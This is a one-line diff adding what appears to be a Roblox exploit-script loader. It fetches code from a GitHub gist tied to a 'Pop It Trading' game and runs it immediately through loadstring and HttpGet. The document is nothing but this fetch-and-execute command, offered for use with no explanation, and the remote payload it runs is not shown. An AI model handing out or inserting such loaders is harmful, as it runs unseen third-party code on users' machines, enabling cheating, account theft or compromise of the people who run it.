@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://gist.githubusercontent.com/ArminScripters/a533adc54c66db96e1cd4ce077c48ee7/raw/4bacb8f29a70f7fd6eb8c69b2cb4934e4d8145cc/PopItTradingWow"), true))()
